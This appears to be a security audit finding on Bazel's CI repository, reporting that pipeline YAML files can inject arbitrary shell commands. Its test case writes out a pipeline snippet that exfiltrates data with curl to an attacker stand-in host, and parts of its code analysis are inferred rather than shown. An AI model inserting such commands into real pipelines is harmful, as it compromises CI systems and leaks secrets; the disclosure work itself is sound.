- Vulnerability Name: Unvalidated YAML Pipeline Configuration leading to Arbitrary Code Execution
- Description:
    1. An attacker submits a malicious pull request to the repository.
    2. A project member merges the pull request without proper vetting.
    3. The pull request contains changes to a YAML pipeline configuration file (e.g., `.bazelci/presubmit.yml`).
    4. The malicious YAML configuration injects arbitrary commands into the `shell_commands`, `batch_commands`, or `run_targets` sections of a pipeline task.
    5. When the CI pipeline executes, the injected commands are executed on the Bazel CI infrastructure, leading to arbitrary code execution.
- Impact:
    - **Critical**: Full compromise of the Bazel CI infrastructure. An attacker can gain unauthorized access to sensitive data, modify CI processes, inject malware into Bazel builds, or pivot to other internal systems.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - The `README.md` file contains a warning: "*Please vet external contributions carefully as they can execute arbitrary code on our CI machines*". This is a documentation-level mitigation, not a technical control.
- Missing Mitigations:
    - **Input validation and sanitization**: The project lacks proper validation and sanitization of the YAML pipeline configuration files, especially the `shell_commands`, `batch_commands`, and `run_targets` sections, to prevent injection of malicious commands.
    - **Principle of least privilege**: The CI pipeline execution environment likely has excessive privileges, allowing successful exploitation to lead to significant impact. Implementing least privilege would limit the damage an attacker can cause.
    - **Code review process enforcement**: While documentation advises careful vetting, there isn't a technical enforcement of secure code review practices for pipeline configuration changes.
- Preconditions:
    1. An attacker must be able to submit a pull request to the repository.
    2. A project member with write access must merge the malicious pull request.
    3. The targeted Buildkite pipeline must be configured to execute the modified YAML configuration from the merged pull request.
- Source Code Analysis:
    1. **File: `/code/buildkite/README.md`**: This file documents the CI system and explicitly warns about the vulnerability: "*Please vet external contributions carefully as they can execute arbitrary code on our CI machines*". This highlights the intended functionality of executing commands from YAML and the acknowledged security risk.
    2. **File: `/code/buildkite/bazelci.py`**: This Python script is the core CI logic. While the provided files don't include the exact code that parses and executes the YAML, the documentation in `README.md` and the structure of pipeline configuration files strongly suggest that this script (or a related one) is responsible for:
        - Loading YAML configuration files.
        - Parsing the `tasks` section.
        - Extracting `shell_commands`, `batch_commands`, and `run_targets` from task configurations.
        - Executing these commands within the Buildkite agent environment.
    3. **File: `/code/pipelines/bazel-postsubmit.yml` and other `pipelines/*.yml`**: These YAML files demonstrate the configuration of pipelines, including the use of `shell_commands`, `batch_commands`, and `run_targets`.  For example, `pipelines/bazel-postsubmit.yml` defines `shell_commands` for tasks like `centos7`:
        ```yaml
        tasks:
          centos7:
            shell_commands:
              - rm -rf $HOME/bazeltest
              - mkdir $HOME/bazeltest
              - bazel mod deps --lockfile_mode=update
        ```
        This confirms that arbitrary shell commands defined in YAML are intended to be executed by the CI system.

    **Visualization:**

- Security Test Case:
    1. **Fork the repository**: As an external attacker, fork the `bazelbuild/continuous-integration` repository.
    2. **Create a malicious branch**: In your forked repository, create a new branch named `malicious-pr`.
    3. **Modify a pipeline configuration**: Edit the file `/code/pipelines/subpar.yml` (or any other pipeline configuration file). Add a malicious command to the `shell_commands` section of the `ubuntu2004` task. For example, modify the `pipelines/subpar.yml` to include:
        ```yaml
        ---
        platforms:
          ubuntu2004:
            shell_commands:
              - whoami > /tmp/pwned.txt # Malicious command to write username to a file
              - curl -X POST -d "$(cat /tmp/pwned.txt)" https://attacker.example.com/ # Exfiltrate username (replace with attacker's server)
              - buildkite-agent artifact upload "/tmp/pwned.txt" # Upload artifact for easy verification
            build_targets:
              - "//..."
            test_targets:
              - "//..."
        ```
    4. **Create a pull request**: Create a pull request from your `malicious-pr` branch to the `master` branch of the `bazelbuild/continuous-integration` repository.
    5. **Wait for the pipeline to trigger**: If the pull request were to be merged (which it should not be in a real attack, this is just for testing), the `subpar` pipeline would be triggered.
    6. **Observe the buildkite output**: In the Buildkite UI for the triggered `subpar` pipeline, examine the logs for the `ubuntu2004` task. You should see the commands `whoami > /tmp/pwned.txt` and `curl -X POST -d "$(cat /tmp/pwned.txt)" https://attacker.example.com/` being executed. Additionally, check the artifacts for `pwned.txt` which should contain the output of the `whoami` command. (For this test case, you would manually trigger the pipeline after making changes to the YAML file directly in the repository, not through a merged PR, for safety and ethical reasons).

This test case demonstrates arbitrary code execution by injecting shell commands into the pipeline configuration. A real attacker would replace the example commands with more malicious payloads.
